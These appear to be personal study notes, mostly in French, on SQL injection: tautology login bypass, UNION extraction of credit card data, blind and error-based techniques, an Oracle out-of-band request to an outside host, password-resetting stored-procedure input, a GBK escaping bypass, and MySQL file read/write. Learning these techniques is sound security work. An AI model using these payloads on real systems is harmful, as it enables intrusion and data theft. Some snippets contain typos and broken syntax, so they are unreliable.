# SQL Injection

## Standard Exploitation

Ecrire `‘or ‘1’ = ‘1`

```sql
# Transform this request : 
SELECT * FROM Users WHERE Username=’$username’ AND Password=’$password’

# In that : 
SELECT * FROM Users WHERE Username=’...’ OR ‘1’ = ‘1’ AND Password=’1’ OR ‘1’ = ‘1’
```

* Penser à utiliser `LIMIT` si besoin
* On peut aussi utiliser des commentaires au lieu de reformer la string `or 1=1 --`  \(be mindful of the last space\) ou `or 1=1#`
* Stacker des requêtes en terminant la 1ère avec un `;` \(impossible si la requête est dans une fonction la préparant, et non-géré par certains systèmes de db\) : `http://www.example.com/product.php?id=10; INSERT INTO users (…)` 

## Union Exploitation

Étendre une requête SELECT avec un `UNION`

```sql
# Tansform this request :
SELECT Name, Phone, Address FROM Users WHERE Id=$id

# In that :
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

* `ALL` est utilisé pour contrecarrer `DISTINCT`
* On rajoute `1, 1` car il faut le même nombre de colonnes que le `SELECT` de base. 
  * Pour déterminer le nombre adéquat, on peut faire un `http://www.example.com/product.php?id=10 ORDER BY 10--` qui retournera soit une erreur, soit quelque chose s’il y a effectivement 10 colonnes.
* En occurrence c’est des int \(donc `1, 1`\), mais il faut que ces colonnes match aussi le types.
  * Pour ça, on peut tester en mettant d’abord null, puis en changeant le genre de données et en vérifiant l’erreur.
* Si seul le premier résultat est montré \(et donc celui de la requête véridique\), on peut fournir un id invalide, comme ça c’est le résultat de notre union qui sera remonté.

## Blind Exploitation \(Oracle\)

* Si le site réagit différemment si une query obtient un résultat ou non, on peut l'utiliser comme Oracle même s'il ne nous donne pas directement le résultat.
* Ca nous permet de deviner caractère par caracètre l'info qu'on recherche
* What to look for :
  * Difference in wording
  * Difference in response status code
  * Time-based difference

## Error Based Exploitation

Forcer des messages d’erreur donnant des informations. Par exemple, pour cette requête :

```sql
SELECT * FROM products WHERE id_product=$id_product
```

On peut lui demander de retourner un hostname en lui fournissant un user database name \(en oracle\) :

`http://www.example.com/product.php?id=10||UTL_INADDR. GET_HOST_NAME( (SELECT user FROM DUAL) )--`

Ce qui nous donnera cette erreur : `ORA-292257: host SCOTT unknown` révélant ainsi le user.

Cette technique diffère évidemment pour chaque database management system.

## Out of band exploitation

Cette technique consiste à utiliser des fonctions du DBMS \(Database management system\) pour envoyer les résultats à un serveur/autre, cela varie évidemment d’un DBMS à l’autre.

En oracle on pourrait par exemple faire ça :

`http://www.example.com/product.php?id=10||UTL_HTTP. request(‘testerserver.com:80’||(SELET user FROM DUAL)--`

Ce qui fera une requête GET vers testserver avec les résultats de la query. \(On peut setup le server avec netcat\).

## Stored Procedure Injection

Apparemment il existe ce genre de syntaxe :

```sql
Create procedure get_report @columnamelist varchar(7900) As Declare @sqlstring varchar(8000) Set @sqlstring = ‘ Select ‘ + @ columnamelist + ‘ from ReportTable‘ exec(@sqlstring) Go
```

Que l’on pourrait abuser avec ce genre d’input :`1 from users; update users set password = ‘password’; select *`

Mais je connais pas cette syntaxe donc je comprends pas trop.

## Insider Info

If you have an injection in a place where doing an "or 1=1" isn't useful, you may still be able to use it to show the table name & structure by injecting an sql command.

## MySQL Server Specificity

Disclaimer : y’a la même pour PL/SQL Server, Microsoft SQL Server, PostGre SQL, Miscrosoft Access et NoSQL mais vu que je les connais pas et que ça m’intéresse pas dans l’immédiat, je l’ai pas détaillé.

Fonctionnalités permettant des injections par version \(depuis y’a probablement eu de nouvelles versions\)

* From Version 4.0: UNION 
* From Version 4.1: Subqueries 
* From Version 5.0: Stored procedures, Stored functions and the view named INFORMATION\_SCHEMA 
* From Version 5.0.2: Triggers

### Single Quote Escape

MySQL permet d’escape les ', ce qui peut annuler certaines attaques quand ce n’est pas possible de contourner l’utilisation des '.

Mais dans certains cas on peut le contourner ainsi :

`password LIKE 'A%'` -&gt; `password LIKE 0x4125` -&gt; `password LIKE CHAR(65,37)`

If the db use the GBK charset \(simplified chinese\) and not the application, using `\xBF'` \(URL-encoded as `%bf%27`\) will prevent `addslashes` \(php function\) from correctly escaping the quote. \(Explained [here](http://shiflett.org/blog/2006/addslashes-versus-mysql-real-escape-string)\)

### Lecture / Ecriture

* On peut écrire dans une fichier avec `into outfile 'path'` \(on ne peut pas contourner les ' ' donc s’ils sont escape, ça ne marche pas\).
* On peut lire avec `load_file(‘name’)`

### Autre

* On ne peut pas accumuler les requêtes \(donc utiliser le `;` pour en commencer une nouvelle\).
* Y’a 2 genres d’utilisateurs `USER()` et `CURRENT_USER()` mais je suis pas sûr des subtilités.
* Comments : `--` \(The space is important\) ou \`\#

### Fonctions utiles

* `LENGTH()`
* `SUBSTRING()`
* `BENCHMARK()`
* `SLEEP()`

